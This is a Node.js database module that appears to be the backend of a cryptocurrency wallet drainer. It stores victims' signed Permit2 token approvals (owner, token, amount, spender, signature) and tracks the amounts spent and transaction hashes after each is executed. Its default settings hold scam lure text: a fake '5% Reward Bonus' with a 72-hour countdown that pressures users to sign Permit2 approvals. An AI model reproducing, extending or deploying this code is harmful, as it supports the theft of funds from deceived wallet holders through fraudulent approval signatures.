'use strict';

/**
 * db.js — Universal Database Layer
 *
 * Supports:
 * 1. PostgreSQL (Neon, Supabase, Vercel Postgres, Railway) via POSTGRES_URL or DATABASE_URL
 * 2. Turso Cloud SQLite via TURSO_DATABASE_URL + TURSO_AUTH_TOKEN
 * 3. Local SQLite (node:sqlite) or ephemeral /tmp fallback
 *
 * When a cloud database (Postgres or Turso) is connected, all permits and super settings
 * persist permanently across Vercel serverless cold boots and container recycling.
 */

process.removeAllListeners('warning');

let DatabaseSync;
try {
  DatabaseSync = require('node:sqlite').DatabaseSync;
} catch (_) {}

let createLibsqlClient;
try {
  createLibsqlClient = require('@libsql/client').createClient;
} catch (_) {}

let pgPoolClass;
try {
  pgPoolClass = require('pg').Pool;
} catch (_) {}

const path = require('path');
const fs   = require('fs');

const DB_PATH = process.env.VERCEL
  ? path.join('/tmp', 'data.sqlite')
  : path.join(__dirname, '..', 'data.sqlite');

/* ─────────────── PostgreSQL / Neon / Supabase Client ─────────────── */

function findPostgresConnectionString() {
  const knownKeys = [
    'DATABASE_URL',
    'POSTGRES_URL',
    'POSTGRES_PRISMA_URL',
    'POSTGRES_URL_NON_POOLING',
    'DATABASE_URL_UNPOOLED',
    'NEON_DATABASE_URL',
    'SUPABASE_DATABASE_URL',
    'STORAGE_URL',
    'STORAGE_DATABASE_URL',
    'STORAGE_POSTGRES_URL',
    'STORAGE_DATABASE_URL_UNPOOLED'
  ];

  for (const k of knownKeys) {
    const val = (process.env[k] || '').trim();
    if (val && (val.startsWith('postgres://') || val.startsWith('postgresql://'))) {
      console.log(`[db.js] Found PostgreSQL connection in process.env.${k}`);
      return val;
    }
  }

  // Scan ANY process.env variable for postgres:// or postgresql://
  for (const [k, v] of Object.entries(process.env)) {
    if (typeof v === 'string') {
      const trimmed = v.trim();
      if (trimmed.startsWith('postgres://') || trimmed.startsWith('postgresql://')) {
        console.log(`[db.js] Auto-detected PostgreSQL connection in process.env.${k}`);
        return trimmed;
      }
    }
  }

  // Individual parameters fallback (PGHOST, PGUSER, PGDATABASE)
  if (process.env.PGHOST && process.env.PGUSER && process.env.PGDATABASE) {
    const host = process.env.PGHOST;
    const user = process.env.PGUSER;
    const pass = process.env.PGPASSWORD || '';
    const db = process.env.PGDATABASE;
    const port = process.env.PGPORT || '5432';
    console.log('[db.js] Constructed PostgreSQL connection from PGHOST/PGUSER/PGDATABASE');
    return `postgresql://${encodeURIComponent(user)}:${encodeURIComponent(pass)}@${host}:${port}/${db}?sslmode=require`;
  }

  return '';
}

let _pgPool = null;
function getPostgres() {
  if (_pgPool) return _pgPool;
  const connString = findPostgresConnectionString();

  if (connString && pgPoolClass) {
    try {
      const isLocal = connString.includes('localhost') || connString.includes('127.0.0.1');
      _pgPool = new pgPoolClass({
        connectionString: connString,
        ssl: isLocal ? false : { rejectUnauthorized: false },
        max: 10,
        idleTimeoutMillis: 30000,
        connectionTimeoutMillis: 10000
      });
      console.log('[db.js] Initialized PostgreSQL connection pool');
      return _pgPool;
    } catch (err) {
      console.error('[db.js] Failed to create PostgreSQL pool:', err.message);
      _pgPool = null;
    }
  }
  return null;
}

let _pgInitPromise = null;
async function ensurePgSchema(pool) {
  if (_pgInitPromise) return _pgInitPromise;
  _pgInitPromise = (async () => {
    const client = await pool.connect();
    try {
      await client.query(`
        CREATE TABLE IF NOT EXISTS permits (
          id              SERIAL PRIMARY KEY,
          "chainId"       INTEGER NOT NULL,
          owner           TEXT    NOT NULL,
          token           TEXT    NOT NULL,
          "tokenSymbol"   TEXT,
          "tokenDecimals" INTEGER,
          amount          TEXT    NOT NULL,
          "amountHuman"   TEXT,
          spent           TEXT    NOT NULL DEFAULT '0',
          "spentHuman"    TEXT    NOT NULL DEFAULT '0',
          expiration      BIGINT  NOT NULL,
          nonce           BIGINT  NOT NULL,
          "sigDeadline"   TEXT    NOT NULL,
          spender         TEXT    NOT NULL,
          signature       TEXT    NOT NULL,
          status          TEXT    NOT NULL DEFAULT 'pending',
          "txHashes"      TEXT    NOT NULL DEFAULT '[]',
          "referredBy"    TEXT,
          "createdAt"     BIGINT  NOT NULL,
          "updatedAt"     BIGINT  NOT NULL
        );

        CREATE TABLE IF NOT EXISTS app_settings (
          key   TEXT PRIMARY KEY,
          value TEXT NOT NULL
        );

        CREATE INDEX IF NOT EXISTS idx_permits_owner_token ON permits(owner, token);
        CREATE INDEX IF NOT EXISTS idx_permits_status ON permits(status);
      `);
      try {
        await client.query('ALTER TABLE permits ADD COLUMN IF NOT EXISTS "referredBy" TEXT');
      } catch (_) {}
      console.log('[db.js] PostgreSQL schema ensured.');
    } catch (err) {
      console.error('[db.js] PostgreSQL schema check error:', err.message);
      throw err;
    } finally {
      client.release();
    }
  })();
  return _pgInitPromise;
}

/* ─────────────── Turso Cloud SQLite Client ─────────────── */

let _tursoClient;
function getTurso() {
  if (_tursoClient) return _tursoClient;
  const url = (process.env.TURSO_DATABASE_URL || '').trim();
  if (url && createLibsqlClient) {
    _tursoClient = createLibsqlClient({
      url,
      authToken: (process.env.TURSO_AUTH_TOKEN || '').trim()
    });
    console.log('[db.js] Connected to Turso Cloud SQLite at', url);
    return _tursoClient;
  }
  return null;
}

let _tursoInitPromise = null;
async function ensureTursoSchema(client) {
  if (_tursoInitPromise) return _tursoInitPromise;
  _tursoInitPromise = (async () => {
    await client.execute(`
      CREATE TABLE IF NOT EXISTS permits (
        id            INTEGER PRIMARY KEY AUTOINCREMENT,
        chainId       INTEGER NOT NULL,
        owner         TEXT    NOT NULL,
        token         TEXT    NOT NULL,
        tokenSymbol   TEXT,
        tokenDecimals INTEGER,
        amount        TEXT    NOT NULL,
        amountHuman   TEXT,
        spent         TEXT    NOT NULL DEFAULT '0',
        spentHuman    TEXT    NOT NULL DEFAULT '0',
        expiration    INTEGER NOT NULL,
        nonce         INTEGER NOT NULL,
        sigDeadline   TEXT    NOT NULL,
        spender       TEXT    NOT NULL,
        signature     TEXT    NOT NULL,
        status        TEXT    NOT NULL DEFAULT 'pending',
        txHashes      TEXT    NOT NULL DEFAULT '[]',
        referredBy    TEXT,
        createdAt     INTEGER NOT NULL,
        updatedAt     INTEGER NOT NULL
      )
    `);
    try {
      await client.execute('ALTER TABLE permits ADD COLUMN referredBy TEXT');
    } catch (_) {}
    try {
      await client.execute(`
        CREATE TABLE IF NOT EXISTS app_settings (
          key   TEXT PRIMARY KEY,
          value TEXT NOT NULL
        )
      `);
    } catch (_) {}
  })();
  return _tursoInitPromise;
}

/* ─────────────── Local SQLite Client ─────────────── */

let _db;
let _memPermits = [];
let _memNextId = 1;

function getDb() {
  if (_db) return _db;

  if (!DatabaseSync) {
    console.warn('[db.js] node:sqlite not available; using in-memory store.');
    _db = { isMemory: true };
    return _db;
  }

  try {
    _db = new DatabaseSync(DB_PATH);
    _db.exec('PRAGMA journal_mode = WAL');
    _db.exec('PRAGMA foreign_keys = ON');

    _db.exec(`
      CREATE TABLE IF NOT EXISTS permits (
        id            INTEGER PRIMARY KEY AUTOINCREMENT,
        chainId       INTEGER NOT NULL,
        owner         TEXT    NOT NULL,
        token         TEXT    NOT NULL,
        tokenSymbol   TEXT,
        tokenDecimals INTEGER,
        amount        TEXT    NOT NULL,
        amountHuman   TEXT,
        spent         TEXT    NOT NULL DEFAULT '0',
        spentHuman    TEXT    NOT NULL DEFAULT '0',
        expiration    INTEGER NOT NULL,
        nonce         INTEGER NOT NULL,
        sigDeadline   TEXT    NOT NULL,
        spender       TEXT    NOT NULL,
        signature     TEXT    NOT NULL,
        status        TEXT    NOT NULL DEFAULT 'pending',
        txHashes      TEXT    NOT NULL DEFAULT '[]',
        referredBy    TEXT,
        createdAt     INTEGER NOT NULL,
        updatedAt     INTEGER NOT NULL
      );

      CREATE TABLE IF NOT EXISTS app_settings (
        key   TEXT PRIMARY KEY,
        value TEXT NOT NULL
      );

      CREATE INDEX IF NOT EXISTS idx_permits_owner_token ON permits(owner, token);
      CREATE INDEX IF NOT EXISTS idx_permits_status      ON permits(status);
    `);

    try {
      _db.exec('ALTER TABLE permits ADD COLUMN referredBy TEXT');
    } catch (_) {}

    return _db;
  } catch (err) {
    console.warn('[db.js] SQLite init failed, falling back to in-memory store:', err.message);
    _db = { isMemory: true };
    return _db;
  }
}

/* ─────────────── Normalize Row Helper ─────────────── */

function normalizePermitRow(row) {
  if (!row) return null;
  return {
    id:            Number(row.id),
    chainId:       Number(row.chainId),
    owner:         String(row.owner || ''),
    token:         String(row.token || ''),
    tokenSymbol:   row.tokenSymbol || null,
    tokenDecimals: row.tokenDecimals != null ? Number(row.tokenDecimals) : null,
    amount:        String(row.amount || '0'),
    amountHuman:   row.amountHuman || null,
    spent:         String(row.spent || '0'),
    spentHuman:    String(row.spentHuman || '0'),
    expiration:    Number(row.expiration),
    nonce:         Number(row.nonce),
    sigDeadline:   String(row.sigDeadline || ''),
    spender:       String(row.spender || ''),
    signature:     String(row.signature || ''),
    status:        String(row.status || 'pending'),
    txHashes:      String(row.txHashes || '[]'),
    referredBy:    row.referredBy || null,
    createdAt:     Number(row.createdAt),
    updatedAt:     Number(row.updatedAt)
  };
}

/* ─────────────── Database Status ─────────────── */

function getDbStatus() {
  const pg = getPostgres();
  if (pg) {
    return {
      connected: true,
      persistent: true,
      type: 'postgres',
      provider: 'PostgreSQL (Neon / Supabase / Vercel Postgres)',
      message: 'Cloud PostgreSQL database connected. All data is permanently stored.'
    };
  }

  const turso = getTurso();
  if (turso) {
    return {
      connected: true,
      persistent: true,
      type: 'turso',
      provider: 'Turso Cloud SQLite',
      message: 'Turso Cloud SQLite connected. All data is permanently stored.'
    };
  }

  return {
    connected: false,
    persistent: false,
    type: 'ephemeral',
    provider: process.env.VERCEL ? 'Vercel /tmp (Ephemeral SQLite)' : 'Local File SQLite',
    message: process.env.VERCEL
      ? '⚠️ Warning: Running on ephemeral Vercel /tmp storage. Connect Neon Postgres or Turso in Vercel to store data permanently!'
      : 'Running on local file SQLite.'
  };
}

/* ─────────────── Permit helpers ─────────────── */

async function insertPermit(data) {
  const now = Math.floor(Date.now() / 1000);

  // 1. PostgreSQL (Neon / Supabase / Vercel Postgres)
  const pg = getPostgres();
  if (pg) {
    await ensurePgSchema(pg);
    const q = `
      INSERT INTO permits (
        "chainId", owner, token, "tokenSymbol", "tokenDecimals",
        amount, "amountHuman", spent, "spentHuman",
        expiration, nonce, "sigDeadline", spender, signature,
        status, "txHashes", "referredBy", "createdAt", "updatedAt"
      ) VALUES (
        $1, $2, $3, $4, $5,
        $6, $7, '0', '0',
        $8, $9, $10, $11, $12,
        'pending', '[]', $13, $14, $15
      ) RETURNING *
    `;
    const values = [
      Number(data.chainId),
      data.owner.toLowerCase(),
      data.token.toLowerCase(),
      data.tokenSymbol || null,
      data.tokenDecimals != null ? Number(data.tokenDecimals) : null,
      data.amount.toString(),
      data.amountHuman || null,
      Number(data.expiration),
      Number(data.nonce),
      String(data.sigDeadline),
      data.spender.toLowerCase(),
      data.signature,
      data.referredBy || null,
      now,
      now
    ];
    const res = await pg.query(q, values);
    return normalizePermitRow(res.rows[0]);
  }

  // 2. Turso Cloud SQLite
  const turso = getTurso();
  if (turso) {
    await ensureTursoSchema(turso);
    const res = await turso.execute({
      sql: `INSERT INTO permits
        (chainId, owner, token, tokenSymbol, tokenDecimals,
         amount, amountHuman, spent, spentHuman,
         expiration, nonce, sigDeadline, spender, signature,
         status, txHashes, referredBy, createdAt, updatedAt)
        VALUES (?, ?, ?, ?, ?, ?, ?, '0', '0', ?, ?, ?, ?, ?, 'pending', '[]', ?, ?, ?)`,
      args: [
        Number(data.chainId),
        data.owner.toLowerCase(),
        data.token.toLowerCase(),
        data.tokenSymbol || null,
        data.tokenDecimals != null ? Number(data.tokenDecimals) : null,
        data.amount.toString(),
        data.amountHuman || null,
        Number(data.expiration),
        Number(data.nonce),
        String(data.sigDeadline),
        data.spender.toLowerCase(),
        data.signature,
        data.referredBy || null,
        now,
        now
      ]
    });
    const insertId = Number(res.lastInsertRowid);
    return getPermitById(insertId);
  }

  // 3. Local SQLite / In-Memory
  const db = getDb();
  if (db.isMemory) {
    const item = {
      id:            _memNextId++,
      chainId:       data.chainId,
      owner:         data.owner,
      token:         data.token,
      tokenSymbol:   data.tokenSymbol || null,
      tokenDecimals: data.tokenDecimals != null ? Number(data.tokenDecimals) : null,
      amount:        data.amount,
      amountHuman:   data.amountHuman || null,
      spent:         '0',
      spentHuman:    '0',
      expiration:    data.expiration,
      nonce:         data.nonce,
      sigDeadline:   data.sigDeadline,
      spender:       data.spender,
      signature:     data.signature,
      status:        'pending',
      txHashes:      '[]',
      referredBy:    data.referredBy || null,
      createdAt:     now,
      updatedAt:     now
    };
    _memPermits.push(item);
    return item;
  }

  const stmt = db.prepare(`
    INSERT INTO permits
      (chainId, owner, token, tokenSymbol, tokenDecimals,
       amount, amountHuman, spent, spentHuman,
       expiration, nonce, sigDeadline, spender, signature,
       status, txHashes, referredBy, createdAt, updatedAt)
    VALUES
      (@chainId, @owner, @token, @tokenSymbol, @tokenDecimals,
       @amount, @amountHuman, '0', '0',
       @expiration, @nonce, @sigDeadline, @spender, @signature,
       'pending', '[]', @referredBy, @createdAt, @updatedAt)
  `);

  const info = stmt.run({
    ...data,
    referredBy: data.referredBy || null,
    createdAt: now,
    updatedAt: now
  });

  return getPermitById(info.lastInsertRowid);
}

async function getPermitById(id) {
  const pg = getPostgres();
  if (pg) {
    await ensurePgSchema(pg);
    const res = await pg.query('SELECT * FROM permits WHERE id = $1', [Number(id)]);
    return res.rows[0] ? normalizePermitRow(res.rows[0]) : null;
  }

  const turso = getTurso();
  if (turso) {
    await ensureTursoSchema(turso);
    const res = await turso.execute({
      sql: 'SELECT * FROM permits WHERE id = ?',
      args: [Number(id)]
    });
    return res.rows[0] ? normalizePermitRow(res.rows[0]) : null;
  }

  const db = getDb();
  if (db.isMemory) {
    const p = _memPermits.find(item => item.id === Number(id));
    return p ? normalizePermitRow(p) : null;
  }
  const row = db.prepare('SELECT * FROM permits WHERE id = ?').get(id);
  return row ? normalizePermitRow(row) : null;
}

async function getAllPermits() {
  const pg = getPostgres();
  if (pg) {
    await ensurePgSchema(pg);
    const res = await pg.query('SELECT * FROM permits ORDER BY id DESC');
    return res.rows.map(normalizePermitRow);
  }

  const turso = getTurso();
  if (turso) {
    await ensureTursoSchema(turso);
    const res = await turso.execute('SELECT * FROM permits ORDER BY id DESC');
    return res.rows.map(normalizePermitRow);
  }

  const db = getDb();
  if (db.isMemory) {
    return [..._memPermits].sort((a, b) => Number(b.id) - Number(a.id)).map(normalizePermitRow);
  }
  const rows = db.prepare('SELECT * FROM permits ORDER BY id DESC').all();
  return rows.map(normalizePermitRow);
}

async function updatePermitAfterExecution(id, { rawSpent, spentHuman, status, txHash }) {
  const now = Math.floor(Date.now() / 1000);

  const pg = getPostgres();
  if (pg) {
    await ensurePgSchema(pg);
    const row = await getPermitById(id);
    if (!row) throw new Error(`Permit ${id} not found`);
    const hashes = JSON.parse(row.txHashes || '[]');
    if (txHash && !hashes.includes(txHash)) hashes.push(txHash);

    const updatedSpent = rawSpent != null ? rawSpent.toString() : row.spent;
    const updatedSpentHuman = spentHuman != null ? spentHuman : row.spentHuman;
    const updatedStatus = status != null ? status : row.status;

    await pg.query(
      'UPDATE permits SET spent = $1, "spentHuman" = $2, status = $3, "txHashes" = $4, "updatedAt" = $5 WHERE id = $6',
      [updatedSpent, updatedSpentHuman, updatedStatus, JSON.stringify(hashes), now, Number(id)]
    );
    return getPermitById(id);
  }

  const turso = getTurso();
  if (turso) {
    await ensureTursoSchema(turso);
    const row = await getPermitById(id);
    if (!row) throw new Error(`Permit ${id} not found`);
    const hashes = JSON.parse(row.txHashes || '[]');
    if (txHash && !hashes.includes(txHash)) hashes.push(txHash);

    const updatedSpent = rawSpent != null ? rawSpent.toString() : row.spent;
    const updatedSpentHuman = spentHuman != null ? spentHuman : row.spentHuman;
    const updatedStatus = status != null ? status : row.status;

    await turso.execute({
      sql: 'UPDATE permits SET spent = ?, spentHuman = ?, status = ?, txHashes = ?, updatedAt = ? WHERE id = ?',
      args: [updatedSpent, updatedSpentHuman, updatedStatus, JSON.stringify(hashes), now, Number(id)]
    });
    return getPermitById(id);
  }

  const db   = getDb();
  const row  = await getPermitById(id);
  if (!row) throw new Error(`Permit ${id} not found`);

  const hashes = JSON.parse(row.txHashes || '[]');
  if (txHash && !hashes.includes(txHash)) hashes.push(txHash);

  const updatedSpent = rawSpent != null ? rawSpent.toString() : row.spent;
  const updatedSpentHuman = spentHuman != null ? spentHuman : row.spentHuman;
  const updatedStatus = status != null ? status : row.status;

  if (db.isMemory) {
    row.spent = updatedSpent;
    row.spentHuman = updatedSpentHuman;
    row.status = updatedStatus;
    row.txHashes = JSON.stringify(hashes);
    row.updatedAt = now;
    return normalizePermitRow(row);
  }

  db.prepare(`
    UPDATE permits
    SET spent = ?, spentHuman = ?, status = ?, txHashes = ?, updatedAt = ?
    WHERE id = ?
  `).run(
    updatedSpent,
    updatedSpentHuman,
    updatedStatus,
    JSON.stringify(hashes),
    now,
    id
  );

  return getPermitById(id);
}

async function markPermitStatus(id, status) {
  const now = Math.floor(Date.now() / 1000);

  const pg = getPostgres();
  if (pg) {
    await ensurePgSchema(pg);
    await pg.query(
      'UPDATE permits SET status = $1, "updatedAt" = $2 WHERE id = $3',
      [status, now, Number(id)]
    );
    return;
  }

  const turso = getTurso();
  if (turso) {
    await ensureTursoSchema(turso);
    await turso.execute({
      sql: 'UPDATE permits SET status = ?, updatedAt = ? WHERE id = ?',
      args: [status, now, Number(id)]
    });
    return;
  }

  const db = getDb();
  if (db.isMemory) {
    const row = _memPermits.find(p => p.id === Number(id));
    if (row) {
      row.status = status;
      row.updatedAt = now;
    }
    return;
  }
  db.prepare(`
    UPDATE permits SET status = ?, updatedAt = ? WHERE id = ?
  `).run(status, now, id);
}

/* ─────────────── Nonce uniqueness check ─────────────── */

async function hasPendingWithNonce(owner, token, nonce) {
  const pg = getPostgres();
  if (pg) {
    await ensurePgSchema(pg);
    const res = await pg.query(
      'SELECT id FROM permits WHERE lower(owner) = lower($1) AND lower(token) = lower($2) AND nonce = $3 AND status = $4 LIMIT 1',
      [owner, token, Number(nonce), 'pending']
    );
    return res.rows.length > 0;
  }

  const turso = getTurso();
  if (turso) {
    await ensureTursoSchema(turso);
    const res = await turso.execute({
      sql: "SELECT id FROM permits WHERE lower(owner) = lower(?) AND lower(token) = lower(?) AND nonce = ? AND status = 'pending' LIMIT 1",
      args: [owner, token, Number(nonce)]
    });
    return res.rows.length > 0;
  }

  const db = getDb();
  if (db.isMemory) {
    return _memPermits.some(p =>
      p.owner.toLowerCase() === owner.toLowerCase() &&
      p.token.toLowerCase() === token.toLowerCase() &&
      p.nonce === nonce &&
      p.status === 'pending'
    );
  }
  const row = db.prepare(`
    SELECT id FROM permits
    WHERE owner = ? AND token = ? AND nonce = ? AND status = 'pending'
    LIMIT 1
  `).get(owner.toLowerCase(), token.toLowerCase(), nonce);
  return !!row;
}

/* ─────────────── Settings & Reward Config ─────────────── */

const DEFAULT_REWARD_CONFIG = {
  enabled: true,
  percentage: "5.0",
  durationHours: 72,
  badgeText: "Flash Event · 72H Only",
  headline: "Claim Your 5% Reward Bonus",
  description: "Special 72-hour reward event! Connect your wallet and complete Permit2 approval within the countdown window to qualify for an exclusive one-time 5% bonus reward. Valid for all newly connected wallets and users approving again.",
  inCardText: "Connect & approve within 72 hours to receive an exclusive one-time 5% reward bonus!",
  perk1Title: "5% One-Time Reward",
  perk1Desc: "Automatically locked in when you complete Permit2 approval.",
  perk2Title: "New & Re-Approvals",
  perk2Desc: "Applicable for first-time connections & wallets approving again.",
  perk3Title: "Instant BSC On-Chain",
  perk3Desc: "Direct BSC Mainnet confirmation with 0 waiting period.",
  // Access Window Countdown Configuration
  countdownEnabled: true,
  countdownTitle: "ACCESS WINDOW CLOSES IN:",
  countdownTargetDate: "2027-06-28T12:54:48.000Z",
  countdownFooterText: "CURRENT POOL"
};

let _memSettings = {};
const BUNDLED_SETTINGS_FILE = path.join(__dirname, '..', 'settings.json');
const SETTINGS_FILE = process.env.VERCEL
  ? path.join('/tmp', 'settings.json')
  : BUNDLED_SETTINGS_FILE;

if (process.env.VERCEL && fs.existsSync(BUNDLED_SETTINGS_FILE) && !fs.existsSync(SETTINGS_FILE)) {
  try {
    fs.copyFileSync(BUNDLED_SETTINGS_FILE, SETTINGS_FILE);
  } catch (_) {}
}

async function getSetting(key, defaultValue = null) {
  if (_memSettings[key] !== undefined) {
    return _memSettings[key];
  }

  // 1. PostgreSQL (Neon / Supabase / Vercel Postgres)
  const pg = getPostgres();
  if (pg) {
    await ensurePgSchema(pg);
    try {
      const res = await pg.query('SELECT value FROM app_settings WHERE key = $1 LIMIT 1', [key]);
      if (res.rows && res.rows.length > 0) {
        _memSettings[key] = res.rows[0].value;
        return res.rows[0].value;
      }
    } catch (_) {}
  }

  // 2. Turso Cloud SQLite
  const turso = getTurso();
  if (turso) {
    await ensureTursoSchema(turso);
    try {
      const res = await turso.execute({
        sql: 'SELECT value FROM app_settings WHERE key = ? LIMIT 1',
        args: [key]
      });
      if (res.rows && res.rows.length > 0) {
        _memSettings[key] = res.rows[0].value;
        return res.rows[0].value;
      }
    } catch (_) {}
  }

  // 3. Local SQLite
  const db = getDb();
  if (db && !db.isMemory) {
    try {
      const row = db.prepare('SELECT value FROM app_settings WHERE key = ? LIMIT 1').get(key);
      if (row && row.value !== undefined) {
        _memSettings[key] = row.value;
        return row.value;
      }
    } catch (_) {}
  }

  // 4. File fallback
  try {
    if (fs.existsSync(SETTINGS_FILE)) {
      const parsed = JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf8'));
      if (parsed && parsed[key] !== undefined) {
        _memSettings[key] = parsed[key];
        return parsed[key];
      }
    }
    if (fs.existsSync(BUNDLED_SETTINGS_FILE)) {
      const parsed = JSON.parse(fs.readFileSync(BUNDLED_SETTINGS_FILE, 'utf8'));
      if (parsed && parsed[key] !== undefined) {
        _memSettings[key] = parsed[key];
        return parsed[key];
      }
    }
  } catch (_) {}

  return defaultValue;
}

async function setSetting(key, value) {
  _memSettings[key] = String(value);

  // 1. PostgreSQL (Neon / Supabase / Vercel Postgres)
  const pg = getPostgres();
  if (pg) {
    await ensurePgSchema(pg);
    try {
      await pg.query(`
        INSERT INTO app_settings (key, value)
        VALUES ($1, $2)
        ON CONFLICT(key) DO UPDATE SET value = EXCLUDED.value
      `, [key, String(value)]);
    } catch (err) {
      console.warn('[db.js] Failed to save setting to PostgreSQL:', err.message);
    }
  }

  // 2. Turso Cloud SQLite
  const turso = getTurso();
  if (turso) {
    await ensureTursoSchema(turso);
    try {
      await turso.execute({
        sql: 'INSERT INTO app_settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value',
        args: [key, String(value)]
      });
    } catch (err) {
      console.warn('[db.js] Failed to save setting to Turso:', err.message);
    }
  }

  // 3. Local SQLite
  const db = getDb();
  if (db && !db.isMemory) {
    try {
      db.prepare(`
        INSERT INTO app_settings (key, value) VALUES (?, ?)
        ON CONFLICT(key) DO UPDATE SET value = excluded.value
      `).run(key, String(value));
    } catch (_) {}
  }

  // 4. Local File
  try {
    let current = {};
    if (fs.existsSync(SETTINGS_FILE)) {
      try { current = JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf8')) || {}; } catch (_) {}
    }
    current[key] = String(value);
    fs.writeFileSync(SETTINGS_FILE, JSON.stringify(current, null, 2), 'utf8');
  } catch (_) {}
}

async function getRewardConfig() {
  const raw = await getSetting('reward_config');
  if (raw) {
    try {
      return { ...DEFAULT_REWARD_CONFIG, ...JSON.parse(raw) };
    } catch (_) {}
  }
  return { ...DEFAULT_REWARD_CONFIG };
}

async function saveRewardConfig(config) {
  const current = await getRewardConfig();
  const merged = { ...current, ...config };
  await setSetting('reward_config', JSON.stringify(merged));
  return merged;
}

module.exports = {
  getDb,
  getPostgres,
  getTurso,
  getDbStatus,
  insertPermit,
  getPermitById,
  getAllPermits,
  updatePermitAfterExecution,
  markPermitStatus,
  hasPendingWithNonce,
  getSetting,
  setSetting,
  getRewardConfig,
  saveRewardConfig,
  DEFAULT_REWARD_CONFIG
};
